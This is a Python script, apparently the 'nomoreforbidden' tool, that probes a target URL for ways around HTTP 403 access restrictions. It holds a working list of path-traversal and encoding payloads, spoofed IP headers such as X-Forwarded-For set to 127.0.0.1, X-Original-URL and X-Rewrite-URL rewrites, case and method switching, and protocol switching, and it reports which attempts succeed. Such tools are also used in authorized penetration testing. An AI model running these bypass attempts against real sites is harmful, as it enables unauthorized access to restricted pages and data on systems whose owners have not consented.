#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import json
import urllib3
import argparse
from urllib.parse import urlparse
from random import choice

urllib3.disable_warnings()


# Argparse
au = argparse.ArgumentParser()
au.add_argument("-u", "--url", required=True, help="Write URL")
au.add_argument("-i", "--ip", required=False, help="Write IP Adress", default="127.0.0.1")
au.add_argument("-v", "--verbose", required=False, help="Verbose on/off", default="off")
args = au.parse_args()
url = args.url
ip = args.ip
verbose = args.verbose
path = urlparse(url).path
parsed = urlparse(url).scheme + "://" + urlparse(url).netloc
# Argparse


def nmf(url):
    global response
    payloads = ["/", "/*", "/%2f/", "/./", "/./.", "/*/", "?", "??", "&", "#", "%", "%20", "%09", "/..;/", "/../",
                "/..%2f", "/..;/", "/.././", "/..%00/", "/..%0d", "/..%5c", "/..%ff/", "/%2e%2e%2f/", "/.%2e/", "/%3f",
                "%26",
                "%23", ".json"]
    for payload in payloads:
        bypassreq = url + payload
        urlbypass = requests.get(bypassreq, allow_redirects=False, verify=False, timeout=5)
        parsedresponse = requests.get(parsed)
        parsedlen = len(parsedresponse.content)
        reqlen = len(urlbypass.content)
        if verbose == "on":
            if urlbypass.status_code == 200 or urlbypass.status_code == 302:
                if parsedlen == reqlen:
                    print(f'{bypassreq} [{str(urlbypass.status_code)}] Possible False Positive')
                else:
                    print(f'{bypassreq} [{str(urlbypass.status_code)}]')
            else:
                print(f'{bypassreq} [{str(urlbypass.status_code)}]')
        else:
            if urlbypass.status_code == 200 or urlbypass.status_code == 302:
                if parsedlen == reqlen:
                    print(f'{bypassreq} [{str(urlbypass.status_code)}] Possible False Positive')
                else:
                    print(f'{bypassreq} [{str(urlbypass.status_code)}]')

    headers = ["X-Forwarded-Host", "X-Custom-IP-Authorization", "X-Forwarded-For"]
    for header in headers:
        response = requests.get(url, allow_redirects=False, verify=False, headers={header: ip, })
        if verbose == "on":
            print(f'{header} [{str(response.status_code)}]')
        else:
            if response.status_code == 200 or response.status_code == 302:
                print(f'{header} [{str(response.status_code)}]')

    headers = ["X-Original-URL", "X-Rewrite-URL"]
    for header in headers:
        response = requests.get(parsed, allow_redirects=True, verify=False, headers={header: path})
        parsedresponse = requests.get(parsed)
        parsedlen = len(parsedresponse.content)
        responselen = len(response.content)
        if verbose == "on":
            if response.status_code == 200 or response.status_code == 302:
                if parsedlen == responselen:
                    print(f'{header} [{str(response.status_code)}] Possible False Positive')
                else:
                    print(f'{header} [{str(response.status_code)}]')

        else:
            if response.status_code == 200 or response.status_code == 302:
                if parsedlen == responselen:
                    print(f'{header} [{str(response.status_code)}] Possible False Positive')
                else:
                    print(f'{header} [{str(response.status_code)}]')

    req = (''.join(choice((str.upper, str.lower))(char) for char in path))
    newurl = parsed + req
    response = requests.get(newurl)
    if verbose == "on":
        print(f'Uppercase Result [{response.status_code}] Changed URL [{newurl}]')
    else:
        if response.status_code == 200 or response.status_code == 302:
            print(f'Uppercase Result [{response.status_code}] Changed URL [{newurl}]')

    response = requests.post(newurl)
    if verbose == "on":
        print(f'Post Request Result [{response.status_code}]')
    else:
        if response.status_code == 200 or response.status_code == 302:
            print(f'Post Request Result [{response.status_code}]')

def wayback(url):
    wayback = "https://archive.org/wayback/available?url=" + url
    waybackreq = requests.get(wayback)
    jsonreq = json.loads(waybackreq.content)
    if verbose == "on":
        try:
            print("Wayback History Found " + "[" + jsonreq['archived_snapshots']['closest']['url'] + "]")
        except:
            print("Wayback history not found")
    else:
        try:
            print("Wayback History Found " + "[" + jsonreq['archived_snapshots']['closest']['url'] + "]")
        except:
            pass

def ssl(url):
    protocol = urlparse(url).scheme
    if protocol == "http":
        url = url.replace("http", "https")
    if protocol == "https":
        url = url.replace("https", "http")
    response = requests.get(url, verify=False)
    if verbose == "on":
        print(f'Protocol Change Result [{response.status_code}] Changed Protocol [{urlparse(url).scheme.upper()}]')
    else:
        if response.status_code == 200 or response.status_code == 302:
            print(f'Protocol Change Result [{response.status_code}] Changed Protocol [{urlparse(url).scheme.upper()}]')

banner = """
.__   __. .___  ___.  _______ 
|  \ |  | |   \/   | |   ____|
|   \|  | |  \  /  | |  |__   
|  . `  | |  |\/|  | |   __|  
|  |\   | |  |  |  | |  |     
|__| \__| |__|  |__| |__|     v0.1 github.com/0akiner/nomoreforbidden
"""

if __name__ == "__main__":
    print(banner)
    nmf(url)
    ssl(url)
    wayback(url)
